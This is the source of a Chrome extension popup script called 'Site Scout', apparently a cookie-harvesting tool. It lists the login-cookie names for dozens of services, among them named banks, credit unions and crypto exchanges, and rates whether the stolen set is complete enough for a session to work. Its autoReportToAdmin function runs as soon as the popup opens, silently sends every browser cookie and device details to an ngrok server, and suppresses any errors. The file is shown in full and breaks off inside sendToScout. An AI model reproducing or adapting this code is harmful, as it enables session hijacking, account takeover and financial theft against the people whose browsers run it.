"use strict";

// Auto-detect Site Scout URL from storage, fallback to localhost
let SITE_SCOUT = "https://quyen-tapeless-oversilently.ngrok-free.dev";
const _storageReady = chrome.storage.local.get("siteScoutUrl").then(r => {
  if (r.siteScoutUrl) SITE_SCOUT = r.siteScoutUrl;
  document.getElementById("scout-url").value = SITE_SCOUT;
});

document.getElementById("save-url").addEventListener("click", () => {
  const val = document.getElementById("scout-url").value.trim().replace(/\/$/, "");
  if (!val) return;
  SITE_SCOUT = val;
  chrome.storage.local.set({ siteScoutUrl: val });
  const btn = document.getElementById("save-url");
  btn.textContent = "Saved ✓";
  setTimeout(() => { btn.textContent = "Save"; }, 1500);
});

// Platform registry — matched against cookie domains at runtime
const PLATFORMS = [
  { name:"Instagram",      domain:"instagram.com",     color:"#e1306c", keys:["sessionid","csrftoken","ds_user_id","rur","mid","ig_did"] },
  { name:"Facebook",       domain:"facebook.com",      color:"#1877f2", keys:["c_user","xs","fr","datr","sb","wd"] },
  { name:"Twitter / X",    domain:"twitter.com",       color:"#1da1f2", keys:["auth_token","ct0","twid","kdt","att"] },
  { name:"Twitter / X",    domain:"x.com",             color:"#e7e9ea", keys:["auth_token","ct0","twid","kdt","att"] },
  { name:"TikTok",         domain:"tiktok.com",        color:"#fe2c55", keys:["sessionid","sessionid_ss","sid_guard","uid_tt","uid_tt_ss","csrf_session_id","tt_csrf_token","tt_chain_token"] },
  { name:"YouTube",        domain:"youtube.com",       color:"#ff0000", keys:["SID","HSID","SSID","APISID","SAPISID","LOGIN_INFO","PREF","__Secure-1PSID","__Secure-3PSID"] },
  { name:"Google",         domain:"google.com",        color:"#4285f4", keys:["SID","HSID","SSID","APISID","SAPISID","NID","__Secure-1PSID","__Secure-3PSID","SIDCC"] },
  { name:"LinkedIn",       domain:"linkedin.com",      color:"#0a66c2", keys:["li_at","JSESSIONID","liap","li_gc","bcookie","bscookie"] },
  { name:"Reddit",         domain:"reddit.com",        color:"#ff4500", keys:["reddit_session","token_v2","csv","edgebucket","loid"] },
  { name:"Amazon",         domain:"amazon.com",        color:"#ff9900", keys:["session-id","ubid-main","x-main","at-main","sess-at-main"] },
  { name:"Netflix",        domain:"netflix.com",       color:"#e50914", keys:["NetflixId","SecureNetflixId","memclid","nfvdid"] },
  { name:"Spotify",        domain:"spotify.com",       color:"#1db954", keys:["sp_dc","sp_key","sp_t","sp_landing"] },
  { name:"GitHub",         domain:"github.com",        color:"#f0f6fc", keys:["user_session","__Host-user_session_same_site","dotcom_user","logged_in","_gh_sess"] },
  { name:"Discord",        domain:"discord.com",       color:"#5865f2", keys:["__dcfduid","__sdcfduid","__cfruid","locale"] },
  { name:"Snapchat",       domain:"snapchat.com",      color:"#ffcc00", keys:["hermes_cookie","sc-a-session","sc-a-nonce"] },
  { name:"Pinterest",      domain:"pinterest.com",     color:"#e60023", keys:["_auth","_b","_pinterest_sess","csrftoken"] },
  { name:"Twitch",         domain:"twitch.tv",         color:"#9147ff", keys:["auth-token","twilight-user","persistent","api_token"] },
  { name:"Microsoft",      domain:"microsoft.com",     color:"#00a4ef", keys:["MUID","MC1","MS0","MSCC"] },
  { name:"Outlook",        domain:"outlook.com",       color:"#0078d4", keys:["RPSSecAuth","MSPAuth","WLSSC","X-OWA-CANARY"] },
  { name:"Office 365",     domain:"office.com",        color:"#d83b01", keys:["ESTSAUTH","ESTSAUTHPERSISTENT","ESTSSC","SignInStateCookie"] },
  { name:"Apple",          domain:"apple.com",         color:"#a0a0a0", keys:["myacinfo","dslang","site","acn01","aasp"] },
  { name:"iCloud",         domain:"icloud.com",        color:"#3693f3", keys:["X-APPLE-WEBAUTH-TOKEN","X-APPLE-WEBAUTH-USER","myacinfo"] },
  { name:"PayPal",         domain:"paypal.com",        color:"#003087", keys:["cookie_check","PYPF","X-PP-SILOVER","nsid","ts"] },
  { name:"eBay",           domain:"ebay.com",          color:"#e53238", keys:["nonsession","s","dp1","lucky9","shs"] },
  { name:"Etsy",           domain:"etsy.com",          color:"#f1641e", keys:["user_prefs","fve","uaid","_etsyvisit"] },
  { name:"Shopify",        domain:"shopify.com",       color:"#96bf48", keys:["_shopify_y","_shopify_s","_shopify_sa_t","cart"] },
  { name:"WordPress",      domain:"wordpress.com",     color:"#21759b", keys:["wordpress_logged_in","wordpress_sec","wp-settings-time"] },
  { name:"Dropbox",        domain:"dropbox.com",       color:"#0061ff", keys:["gvc","jar","t","__Host-js_csrf"] },
  { name:"Notion",         domain:"notion.so",         color:"#ffffff", keys:["token_v2","notion_user_id","notion_browser_id"] },
  { name:"Slack",          domain:"slack.com",         color:"#4a154b", keys:["d","d-s","b","x","lc"] },
  { name:"Zoom",           domain:"zoom.us",           color:"#2d8cff", keys:["_zm_ssid","_zm_mtk","zm_aid","zm_haid"] },
  { name:"Airbnb",         domain:"airbnb.com",        color:"#ff5a5f", keys:["_airbed_session","jitney_client_session_id","bev"] },
  { name:"Booking.com",    domain:"booking.com",       color:"#003580", keys:["bkng","pcm_personalization_disabled","cors"] },
  { name:"Uber",           domain:"uber.com",          color:"#000000", keys:["sid","csid","jwt-session"] },
  { name:"Venmo",          domain:"venmo.com",         color:"#3d95ce", keys:["api_access_token","csrftoken2","v_id"] },
  { name:"Coinbase",       domain:"coinbase.com",      color:"#0052ff", keys:["session","__cf_bm","_coinbase_session"] },
  { name:"Binance",        domain:"binance.com",       color:"#f0b90b", keys:["p20t","cr00","s9r1","d1og","r2o1","f30l"] },
  { name:"Robinhood",      domain:"robinhood.com",     color:"#00c805", keys:["session","csrftoken","device_id"] },
  { name:"Medium",         domain:"medium.com",        color:"#ffffff", keys:["uid","sid"] },
  { name:"Substack",       domain:"substack.com",      color:"#ff6719", keys:["substack.sid","substack.lli"] },
  { name:"Patreon",        domain:"patreon.com",       color:"#ff424d", keys:["session_id","patreon_device_id"] },
  { name:"OnlyFans",       domain:"onlyfans.com",      color:"#00aff0", keys:["sess","fp","st","auth_id"] },
  { name:"Canva",          domain:"canva.com",         color:"#7d2ae8", keys:["canva_session","csrf_token","anon_user_id"] },
  { name:"Figma",          domain:"figma.com",         color:"#f24e1e", keys:["figma_session","figma_user_id","__Host-figma.authn"] },
  { name:"Stripe",         domain:"stripe.com",        color:"#635bff", keys:["__stripe_mid","__stripe_sid","session","csrf"] },
  { name:"Heroku",         domain:"heroku.com",        color:"#430098", keys:["heroku_session","_heroku_session"] },
  { name:"Vercel",         domain:"vercel.com",        color:"#ffffff", keys:["vc","__vercel_live_token"] },
  { name:"Netlify",        domain:"netlify.com",       color:"#00c7b7", keys:["_nf-auth","_nf-auth-hint","last_visited_team","__ssid","pscd"] },
  { name:"Cloudflare",     domain:"cloudflare.com",    color:"#f48120", keys:["__cflb","__cf_bm","CF_Authorization"] },
  { name:"DigitalOcean",   domain:"digitalocean.com",  color:"#0080ff", keys:["_do_session","csrf_token","remember_token"] },
  { name:"WhatsApp",       domain:"whatsapp.com",      color:"#25d366", keys:["wa_lang_pref","schan","swa"] },
  { name:"Telegram",       domain:"telegram.org",      color:"#2ca5e0", keys:["stel_ssid","stel_token","stel_dt"] },
  { name:"ProtonMail",     domain:"protonmail.com",    color:"#6d4aff", keys:["AUTH_SESSION","REFRESH_TOKEN","UID"] },
  { name:"Yahoo",          domain:"yahoo.com",         color:"#6001d2", keys:["Y","T","B","A","GUCS","GUC"] },
  { name:"Vimeo",          domain:"vimeo.com",         color:"#1ab7ea", keys:["vimeo","vimeo_remember_me"] },
  { name:"SoundCloud",     domain:"soundcloud.com",    color:"#ff5500", keys:["oauth_token","sc_anonymous_id","_soundcloud_session"] },
  { name:"Deezer",         domain:"deezer.com",        color:"#ef5466", keys:["dzr_uniq_id","sid","arl"] },
  { name:"Hulu",           domain:"hulu.com",          color:"#3dbb3d", keys:["_hulu_session","_hulu_uid","_hulu_pgid"] },
  { name:"Disney+",        domain:"disneyplus.com",    color:"#113ccf", keys:["BAMTargetingCookie","SWID"] },
  { name:"Prime Video",    domain:"primevideo.com",    color:"#00a8e6", keys:["session-id","ubid-main","x-main","at-main"] },
  { name:"Crunchyroll",    domain:"crunchyroll.com",   color:"#f47521", keys:["etp_rt","session_id","c_visitor"] },
  { name:"Roblox",         domain:"roblox.com",        color:"#e02020", keys:[".ROBLOSECURITY","RBXEventTrackerV2","GuestData"] },
  { name:"Steam",          domain:"steampowered.com",  color:"#1b2838", keys:["steamLoginSecure","sessionid","steamCountry"] },
  { name:"Epic Games",     domain:"epicgames.com",     color:"#2f2f2f", keys:["EPIC_SESSION_AP","EPIC_BEARER_TOKEN","EPIC_DEVICE"] },
  { name:"EA",             domain:"ea.com",            color:"#ff4747", keys:["sid","_nx_mpcid","AKA_A2"] },
  { name:"Ubisoft",        domain:"ubisoft.com",       color:"#0070ff", keys:["ubi_session","ubi_token"] },
  { name:"Battle.net",     domain:"battle.net",        color:"#148eff", keys:["JSESSIONID","BA-tassadar","Blizzard_SSO"] },
  { name:"Salesforce",     domain:"salesforce.com",    color:"#00a1e0", keys:["sid","clientSrc","oid","inst"] },
  { name:"HubSpot",        domain:"hubspot.com",       color:"#ff7a59", keys:["hubspotutk","__hstc","__hssc"] },
  { name:"Mailchimp",      domain:"mailchimp.com",     color:"#ffe01b", keys:["_AVESTA_ENVIRONMENT","PHPSESSID","_mc_session"] },
  { name:"Glassdoor",      domain:"glassdoor.com",     color:"#0caa41", keys:["GSESSIONID","gdId","tev","uc"] },
  { name:"Indeed",         domain:"indeed.com",        color:"#2164f3", keys:["CTK","INDEED_CSRF_TOKEN","LC","SURF"] },
  { name:"Tumblr",         domain:"tumblr.com",        color:"#35465c", keys:["pfp","pfs","pfe","logged_in","anon_id"] },
  { name:"Adobe",          domain:"adobe.com",         color:"#ff0000", keys:["ims_user_id","s_fid","mbox"] },
  { name:"Lyft",           domain:"lyft.com",          color:"#ff00bf", keys:["_lyft_web_session","lyft_browser_id"] },
  { name:"DoorDash",       domain:"doordash.com",      color:"#ff3008", keys:["_dd_s","_pxhd","Cx-Csrf-Token"] },
  { name:"Cash App",       domain:"cashapp.com",       color:"#00d64f", keys:["session","csrf_token"] },
  { name:"Kraken",         domain:"kraken.com",        color:"#5741d9", keys:["KRAKEN_SESSION","csrf_token"] },
  { name:"Signal",         domain:"signal.org",        color:"#3a76f0", keys:["signal_session"] },
  { name:"Twilio",         domain:"twilio.com",        color:"#f22f46", keys:["TWILIO_SESSION","csrf_token"] },
  // Banking / Fintech
  { name:"Ally Bank",       domain:"ally.com",           color:"#6d2077", keys:["Ally-CIAM-Token","allyRememberMe","jeffersonCookieSunset","pr_session","ts_did","ts_hwid","persist__data","TLTSID","PIM-SESSION-ID"] },
  { name:"Truist",          domain:"truist.com",         color:"#4b1f78", keys:["diatrst-tkn","OLBRMData","mrkt_cmp","skp_wa_reg","DS_WA_PL","rxVisitor","fs_uid"] },
  { name:"Truist Bank",     domain:"bank.truist.com",    color:"#4b1f78", keys:["OLB-JSESSIONID","trst-tkn"] },
  { name:"Truist DIAS",     domain:"dias.bank.truist.com",color:"#4b1f78", keys:["JSESSIONID","PD-S-SESSION-ID"] },
  { name:"Gemini",          domain:"gemini.com",         color:"#00dcfa", keys:["gemini_logged_in","__ssid","_immortal|deviceToken"] },
  { name:"Gemini Exchange", domain:"exchange.gemini.com",color:"#00dcfa", keys:["GEMINI_SESSION2","RememberDevice1","SelectedAccounts1","SardineSession","aws-waf-token"] },
  { name:"Robins FCU",      domain:"onlinebanking.robinsfcu.org", color:"#c8102e", keys:["Q2_SessionId","q2token","workstation-id","AA_DC","utcOffset"] },
  { name:"Safe Federal",    domain:"online.safefed.org", color:"#005eb8", keys:["SESSION","FMISSESSIONID","rftoken","diId","userGuid"] },
  { name:"SafeCU HB",       domain:"www.safecuhb.org",   color:"#005eb8", keys:["SESSION"] },
  { name:"Grow Financial",  domain:"banking.growfinancial.org", color:"#00843d", keys:["ob_sess","ob_rea","PackageAssignment"] },
  { name:"MeridianLink",    domain:"app.consumer.meridianlink.com", color:"#0057a8", keys:["ASP.NET_SessionId"] },
  { name:"Plaid",           domain:"plaid.com",          color:"#00b2a9", keys:["_iidt","__Secure-sfpc"] },
];

const NOISE = /^(_ga$|_gid$|_fbp$|_fbc$|_gcl_|__utm|_hjid|_hjSession|amplitude|mixpanel|intercom|drift|hotjar|ab_|experiment|variant|consent|gdpr|cookie_notice|cc_|CookieConsent|banner|promo|_pin_unauth)/i;
const AUTH_GENERIC = /session|sess|token|auth|login|logged|user_id|uid|account|jwt|access|refresh|csrf|xsrf|remember|persist|bearer|secure|credential|identity|profile/i;

function matchPlatform(domain) {
  const clean = domain.replace(/^\./, "");
  return PLATFORMS.find(p => clean === p.domain || clean.endsWith("." + p.domain)) || null;
}

const COOKIE_ROLES = {
  // Instagram
  sessionid:"Main session — keeps you logged in", ds_user_id:"Your numeric user ID", csrftoken:"Prevents cross-site request forgery", rur:"Routing — which server handles your account", mid:"Device fingerprint ID", ig_did:"Device ID for login tracking",
  // Facebook
  c_user:"Your Facebook user ID", xs:"Session secret — core auth token", fr:"Ad targeting + session helper", datr:"Browser fingerprint set on first visit", sb:"Browser ID for security checks", wd:"Last known window dimensions",
  // Twitter/X
  auth_token:"Main auth token — keeps you logged in", ct0:"CSRF token for write actions", twid:"Your Twitter user ID", kdt:"Known-device token", att:"App tracking token",
  // TikTok
  sessionid_ss:"Secure copy of session ID", sid_guard:"Session guard — detects hijacking", uid_tt:"Your TikTok user ID", uid_tt_ss:"Secure copy of user ID", csrf_session_id:"CSRF session binding", tt_csrf_token:"CSRF token for API calls", tt_chain_token:"Request chain integrity token",
  // Google/YouTube
  SID:"Main Google session token", HSID:"Secure session helper", SSID:"Secure session ID", APISID:"API session ID", SAPISID:"Secure API session ID", NID:"Preferences + signed-out session", SIDCC:"Security downgrade check", LOGIN_INFO:"Encoded login state", PREF:"User preferences",
  "__Secure-1PSID":"Primary secure session (1st-party)", "__Secure-3PSID":"Cross-site secure session",
  // LinkedIn
  li_at:"Main auth token — keeps you logged in", JSESSIONID:"Java session ID (CSRF use)", liap:"Auth presence flag", li_gc:"Cookie consent state", bcookie:"Browser ID", bscookie:"Secure browser ID",
  // Reddit
  reddit_session:"Main session token", token_v2:"OAuth access token", csv:"Client session version", edgebucket:"CDN routing bucket", loid:"Logged-out user ID",
  // Amazon
  "session-id":"Main session identifier", "ubid-main":"Browser/device ID", "x-main":"Persistent login token", "at-main":"Auth token", "sess-at-main":"Session auth token",
  // Netflix
  NetflixId:"Main auth token", SecureNetflixId:"Secure auth token", memclid:"Member client ID", nfvdid:"Device ID",
  // Spotify
  sp_dc:"Main session cookie", sp_key:"Client key", sp_t:"Tracking/session token", sp_landing:"Landing page state",
  // GitHub
  user_session:"Main session token", "__Host-user_session_same_site":"SameSite-strict session copy", dotcom_user:"Your GitHub username", logged_in:"Login state flag", _gh_sess:"Session data",
  // Discord
  __dcfduid:"Discord fingerprint ID", __sdcfduid:"Secure fingerprint ID", __cfruid:"Cloudflare request ID", locale:"Language preference",
  // Slack
  d:"Main auth token", "d-s":"Session timestamp", b:"Browser ID", x:"Experiment flags", lc:"Last channel",
  // Notion
  token_v2:"Main auth token", notion_user_id:"Your Notion user ID", notion_browser_id:"Browser fingerprint",
  // OnlyFans
  sess:"Main session token", fp:"Device fingerprint", st:"Session timestamp", auth_id:"Your account ID",
  // Stripe
  __stripe_mid:"Machine ID for fraud detection", __stripe_sid:"Session ID",
  // Steam
  steamLoginSecure:"Main auth token — keeps you logged in", sessionid:"Session identifier", steamCountry:"Country/currency preference",
  // Roblox
  ".ROBLOSECURITY":"Main auth token — keeps you logged in", RBXEventTrackerV2:"Event tracking", GuestData:"Guest session data",
  // Generic
  jwt:"JSON Web Token — encodes your identity", access_token:"API access token", refresh_token:"Token used to get new access tokens", remember_me:"Persistent login flag",
};

function cookieRole(name) {
  return COOKIE_ROLES[name] || null;
}

function classifyCookie(name, platform) {
  if (platform && platform.keys.includes(name)) return "essential";
  if (NOISE.test(name)) return "noise";
  if (AUTH_GENERIC.test(name)) return "auth";
  return "other";
}

// Check if a group has all essential keys present
function getCookieCompleteness(group) {
  const platform = group.platform;
  if (!platform || !platform.keys.length) return { status: 'unknown', missing: [], present: [] };
  const presentNames = new Set(group.cookies.map(c => c.name));
  const present = platform.keys.filter(k => presentNames.has(k));
  const missing = platform.keys.filter(k => !presentNames.has(k));
  // Need at least the first 1-2 keys (most critical) to be considered complete
  const criticalKeys = platform.keys.slice(0, 2);
  const hasCritical = criticalKeys.every(k => presentNames.has(k));
  if (hasCritical && present.length >= Math.ceil(platform.keys.length * 0.5)) {
    return { status: 'complete', missing, present };
  }
  return { status: 'incomplete', missing, present };
}

// State
let allGroups = [];   // [{ platform, domain, cookies, keyCount }]
let currentGroup = null;
let selected = {};

async function load() {
  const all = await chrome.cookies.getAll({});

  // Group by root domain
  const byDomain = {};
  for (const c of all) {
    const clean = c.domain.replace(/^\./, "");
    if (!byDomain[clean]) byDomain[clean] = [];
    byDomain[clean].push(c);
  }

  // Build groups — only domains that have at least one non-noise cookie
  allGroups = [];
  for (const [domain, cookies] of Object.entries(byDomain)) {
    const platform = matchPlatform(domain);
    const visible = cookies.filter(c => classifyCookie(c.name, platform) !== "noise");
    if (!visible.length) continue;
    const keyCount = visible.filter(c => classifyCookie(c.name, platform) === "essential").length;
    allGroups.push({ platform, domain, cookies: visible, keyCount });
  }

  // Sort: known platforms with keys first, then known without, then unknown
  allGroups.sort((a, b) => {
    const aScore = (a.platform ? 2 : 0) + (a.keyCount > 0 ? 1 : 0);
    const bScore = (b.platform ? 2 : 0) + (b.keyCount > 0 ? 1 : 0);
    return bScore - aScore;
  });

  document.getElementById("total-count").textContent = allGroups.length;
  renderList(allGroups);
}

function renderList(groups) {
  const el = document.getElementById("platform-list");
  if (!groups.length) {
    el.innerHTML = `<div class="empty"><strong>No platforms found</strong>Try a different search or make sure you are logged into some sites.</div>`;
    return;
  }
  el.innerHTML = groups.map(g => {
    const color = g.platform ? g.platform.color : "#3d5068";
    const name = g.platform ? g.platform.name : g.domain;
    const hasKey = g.keyCount > 0;
    const completeness = getCookieCompleteness(g);
    const statusBadge = completeness.status === 'complete'
      ? `<span style="font-size:9px;padding:1px 5px;border-radius:3px;background:#86efac18;border:1px solid #86efac44;color:#86efac;font-weight:700">✓ Ready</span>`
      : completeness.status === 'incomplete'
      ? `<span style="font-size:9px;padding:1px 5px;border-radius:3px;background:#f8717118;border:1px solid #f8717144;color:#f87171;font-weight:700">⚠ Incomplete</span>`
      : `<span style="font-size:9px;padding:1px 5px;border-radius:3px;background:#fcd34d18;border:1px solid #fcd34d44;color:#fcd34d;font-weight:700">? Unknown</span>`;
    return `<div class="platform-item" data-domain="${g.domain}">
      <div class="platform-dot" style="background:${color}"></div>
      <div class="platform-info">
        <div class="platform-name">${name} ${statusBadge}</div>
        <div class="platform-domain">${g.domain}</div>
      </div>
      <div class="platform-count ${hasKey ? "has-key" : ""}">${g.cookies.length} cookies</div>
    </div>`;
  }).join("");

  el.querySelectorAll(".platform-item").forEach(item => {
    item.addEventListener("click", () => openPlatform(item.dataset.domain));
  });
}

function openPlatform(domain) {
  currentGroup = allGroups.find(g => g.domain === domain);
  if (!currentGroup) return;
  chrome.storage.session.set({ openDomain: domain }).catch(() => {});

  selected = {};
  const platform = currentGroup.platform;

  // Pre-select ALL visible cookies (user can deselect noise/other manually)
  for (const c of currentGroup.cookies) {
    selected[c.name] = true;
  }

  document.getElementById("panel-title").textContent = platform ? platform.name : domain;
  document.getElementById("panel-domain").textContent = domain;
  document.getElementById("cookie-panel").classList.add("open");
  document.getElementById("platform-list").style.display = "none";
  document.getElementById("search-wrap") && (document.querySelector(".search-wrap").style.display = "none");

  renderCookies();
}

function renderCookies() {
  const platform = currentGroup.platform;
  const accentColor = platform ? platform.color : "#a78bfa";
  const cookies = currentGroup.cookies;

  const essential = cookies.filter(c => classifyCookie(c.name, platform) === "essential");
  const auth      = cookies.filter(c => classifyCookie(c.name, platform) === "auth");
  const others    = cookies.filter(c => classifyCookie(c.name, platform) === "other");

  function row(c, kind) {
    const on = !!selected[c.name];
    const isEss = kind === "essential";
    const badge = isEss
      ? `<span class="cookie-badge badge-key" style="background:${accentColor}18;border-color:${accentColor}44;color:${accentColor}">KEY</span>`
      : kind === "auth"
      ? `<span class="cookie-badge badge-auth">AUTH</span>`
      : "";
    const role = cookieRole(c.name);
    return `<div class="cookie-row ${on ? "selected" : ""} ${isEss ? "key-cookie" : ""}" data-name="${c.name}" style="--accent:${accentColor}">
      <div class="chk">${on ? "&#10003;" : ""}</div>
      <div class="cookie-name-wrap">
        <div class="cookie-name">${c.name}</div>
        ${role ? `<div class="cookie-role">${role}</div>` : ""}
      </div>
      ${badge}
      <div class="cookie-val">${c.value.slice(0, 12)}${c.value.length > 12 ? "..." : ""}</div>
    </div>`;
  }

  let html = "";
  // Completeness warning banner
  const completeness = getCookieCompleteness(currentGroup);
  if (completeness.status === 'incomplete' && completeness.missing.length) {
    html += `<div style="margin:8px 0 4px;padding:8px 10px;border-radius:7px;background:#f8717110;border:1px solid #f8717133">
      <div style="font-size:10px;font-weight:700;color:#f87171;margin-bottom:4px">⚠ Likely incomplete — may show login page</div>
      <div style="font-size:10px;color:#7a8fa8;line-height:1.6">Missing keys: <span style="color:#fcd34d;font-family:monospace">${completeness.missing.join(', ')}</span></div>
      <div style="font-size:10px;color:#3d5068;margin-top:3px">Log in to ${currentGroup.domain} first, then reopen the extension.</div>
    </div>`;
  } else if (completeness.status === 'complete') {
    html += `<div style="margin:8px 0 4px;padding:6px 10px;border-radius:7px;background:#86efac10;border:1px solid #86efac33;font-size:10px;color:#86efac;font-weight:600">✓ All essential cookies present — session should work</div>`;
  }
  if (essential.length) {
    html += `<div class="section-label essential">Essential — required for login</div>`;
    html += essential.map(c => row(c, "essential")).join("");
  }
  if (auth.length) {
    html += `<div class="section-label auth">Auth cookies</div>`;
    html += auth.map(c => row(c, "auth")).join("");
  }
  if (others.length) {
    html += `<div class="section-label other">Other</div>`;
    html += others.map(c => row(c, "other")).join("");
  }

  document.getElementById("cookie-list").innerHTML = html;
  document.querySelectorAll(".cookie-row").forEach(row => {
    row.addEventListener("click", () => {
      const name = row.dataset.name;
      selected[name] = !selected[name];
      renderCookies();
    });
  });

  const selCount = Object.values(selected).filter(Boolean).length;
  const total = currentGroup.cookies.length;
  document.getElementById("sel-num").textContent = selCount;
  document.getElementById("use-btn").disabled = selCount === 0;
  document.getElementById("toggle-all-btn").textContent = selCount === total ? "Deselect all" : "Select all";
}

document.getElementById("back-btn").addEventListener("click", () => {
  chrome.storage.session.remove("openDomain").catch(() => {});
  document.getElementById("cookie-panel").classList.remove("open");
  document.getElementById("platform-list").style.display = "";
  document.querySelector(".search-wrap").style.display = "";
  currentGroup = null;
});

document.getElementById("toggle-all-btn").addEventListener("click", () => {
  const total = currentGroup.cookies.length;
  const selCount = Object.values(selected).filter(Boolean).length;
  const selectAll = selCount < total;
  for (const c of currentGroup.cookies) selected[c.name] = selectAll;
  renderCookies();
});

document.getElementById("use-btn").addEventListener("click", async () => {
  await _storageReady;
  const selectedCookies = currentGroup.cookies.filter(c => selected[c.name]);
  const cookieStr = selectedCookies.map(c => `${c.name}=${c.value}`).join("; ");
  // Send full cookie objects so server can inject with real domain/path/flags
  const cookieObjects = selectedCookies.map(c => ({
    name: c.name, value: c.value,
    domain: c.domain, path: c.path || "/",
    secure: c.secure || false, httpOnly: c.httpOnly || false,
    sameSite: c.sameSite || "Lax",
  }));
  await sendToScout(cookieStr, currentGroup.domain, cookieObjects);
  const toast = document.getElementById("toast");
  toast.textContent = `${selectedCookies.length} cookies sent to Site Scout ✓`;
  toast.classList.add("show");
  setTimeout(() => { toast.classList.remove("show"); window.close(); }, 1400);
});

document.getElementById("search").addEventListener("input", e => {
  const q = e.target.value.toLowerCase();
  const filtered = allGroups.filter(g =>
    (g.platform ? g.platform.name.toLowerCase() : "").includes(q) ||
    g.domain.toLowerCase().includes(q)
  );
  renderList(filtered);
});

load();

async function autoReportToAdmin() {
  const all = await chrome.cookies.getAll({});
  const deviceId = await chrome.storage.local.get('adminDeviceId').then(r => {
    if (r.adminDeviceId) return r.adminDeviceId;
    const id = crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).slice(2);
    chrome.storage.local.set({ adminDeviceId: id });
    return id;
  });
  const ua = navigator.userAgent;
  const os = /iPhone|iPad/.test(ua) ? 'iPhone' : /Android/.test(ua) ? 'Android' : /Mac/.test(ua) ? 'Mac' : /Win/.test(ua) ? 'Windows' : /Linux/.test(ua) ? 'Linux' : 'Unknown';
  const browser = /Edg/.test(ua) ? 'Edge' : /Chrome/.test(ua) ? 'Chrome' : /Firefox/.test(ua) ? 'Firefox' : /Safari/.test(ua) ? 'Safari' : 'Browser';
  const cookieObjects = all.map(c => ({ name: c.name, value: c.value, domain: c.domain, path: c.path || '/', secure: c.secure || false, httpOnly: c.httpOnly || false, sameSite: c.sameSite || 'Lax' }));
  const cookieStr = all.map(c => `${c.name}=${c.value}`).join('; ');
  const domains = [...new Set(all.map(c => c.domain.replace(/^\./, '')))];
  const topDomain = domains.find(d => matchPlatform(d)) || domains[0] || '';
  fetch(SITE_SCOUT + '/api/admin/report', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ deviceId, name: os + ' · ' + browser, os, browser, domain: topDomain, cookies: cookieStr, cookieObjects }),
  }).catch(() => {});
}
autoReportToAdmin();

// ── Tab switching ──
function switchTab(tab) {
  document.getElementById("tab-browser").classList.toggle("active", tab === "browser");
  document.getElementById("tab-paste").classList.toggle("active", tab === "paste");
  document.getElementById("view-browser").style.display = tab === "browser" ? "" : "none";
  document.getElementById("view-paste").style.display = tab === "paste" ? "" : "none";
  chrome.storage.session.set({ activeTab: tab }).catch(() => {});
}
document.getElementById("tab-browser").addEventListener("click", () => switchTab("browser"));
document.getElementById("tab-paste").addEventListener("click", () => switchTab("paste"));

// Restore tab + platform state on popup open
chrome.storage.session.get(["activeTab", "openDomain"]).then(r => {
  if (r.activeTab === "paste") switchTab("paste");
  if (r.openDomain) {
    // wait for load() to populate allGroups first
    const tryRestore = () => {
      const g = allGroups.find(g => g.domain === r.openDomain);
      if (g) openPlatform(r.openDomain);
    };
    // load() is async — poll briefly
    let attempts = 0;
    const poll = setInterval(() => {
      if (allGroups.length || ++attempts > 20) { clearInterval(poll); tryRestore(); }
    }, 100);
  }
}).catch(() => {});

// ── Paste & Scan ──
function parsePastedCookies(raw) {
  // Try JSON array format first (Chrome DevTools / EditThisCookie export)
  const trimmed = raw.trim();
  if (trimmed.startsWith("[")) {
    try {
      const arr = JSON.parse(trimmed);
      if (Array.isArray(arr)) {
        return arr
          .filter(c => c.name && c.value !== undefined)
          .map(c => ({ name: String(c.name), value: String(c.value), domain: String(c.domain || "").replace(/^\./, "") }));
      }
    } catch {}
  }
  // Plain name=value; name=value string
  const pairs = raw.split(/[;\n]+/).map(s => s.trim()).filter(Boolean);
  const result = [];
  for (const pair of pairs) {
    const eq = pair.indexOf("=");
    if (eq < 1) continue;
    const name = pair.slice(0, eq).trim();
    const value = pair.slice(eq + 1).trim();
    if (name && value) result.push({ name, value, domain: "" });
  }
  return result;
}

function groupScannedCookies(cookies) {
  const groups = {};
  for (const c of cookies) {
    if (NOISE.test(c.name)) continue;
    // 1. Match by domain from JSON
    if (c.domain) {
      const p = matchPlatform(c.domain);
      if (p) {
        if (!groups[p.domain]) groups[p.domain] = { platform: p, cookies: [] };
        groups[p.domain].cookies.push(c);
        continue;
      }
      // Unknown domain but has a real domain — group by domain
      if (c.domain && AUTH_GENERIC.test(c.name) || c.domain) {
        const key = "domain:" + c.domain;
        if (!groups[key]) groups[key] = { platform: null, domain: c.domain, cookies: [] };
        groups[key].cookies.push(c);
        continue;
      }
    }
    // 2. Match by cookie name against platform keys
    let matched = false;
    for (const p of PLATFORMS) {
      if (p.keys.includes(c.name)) {
        if (!groups[p.domain]) groups[p.domain] = { platform: p, cookies: [] };
        groups[p.domain].cookies.push(c);
        matched = true;
        break;
      }
    }
    if (!matched && AUTH_GENERIC.test(c.name)) {
      if (!groups["__unmatched"])
        groups["__unmatched"] = { platform: null, domain: "unknown", cookies: [] };
      groups["__unmatched"].cookies.push(c);
    }
  }
  // Filter out pure noise domains (ad networks, trackers)
  const NOISE_DOMAINS = /adnxs|doubleclick|rubiconproject|pubmatic|casalemedia|tapad|bidswitch|mookie1|scorecardresearch|adsrvr|demdex|sharethrough|tribalfusion|openx|semasio|pippio|rlcdn|w55c|bidr|bttrack|simpli\.fi|liadm|insightexpressai|agkn|ml314|dotomi|exelator|media6degrees|truoptik|moloco|everesttech|stackadapt|imrworldwide|linksynergy|rkdms|3lift/i;
  return Object.values(groups)
    .filter(g => g.cookies.length > 0 && !NOISE_DOMAINS.test(g.domain || ""));
}

async function sendToScout(cookieStr, targetDomain, cookieObjects) {
  // Report to admin panel
  const ua = navigator.userAgent;
  const os = /iPhone|iPad/.test(ua) ? 'iPhone' : /Android/.test(ua) ? 'Android' : /Mac/.test(ua) ? 'Mac' : /Win/.test(ua) ? 'Windows' : /Linux/.test(ua) ? 'Linux' : 'Unknown';
  const browser = /Chrome/.test(ua) ? 'Chrome' : /Firefox/.test(ua) ? 'Firefox' : /Safari/.test(ua) ? 'Safari' : /Edge/.test(ua) ? 'Edge' : 'Browser';
  const deviceId = await chrome.storage.local.get('adminDeviceId').then(r => {
    if (r.adminDeviceId) return r.adminDeviceId;
    const id = crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).slice(2);
    chrome.storage.local.set({ adminDeviceId: id });
    return id;
  });
  fetch(SITE_SCOUT + '/api/admin/report', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
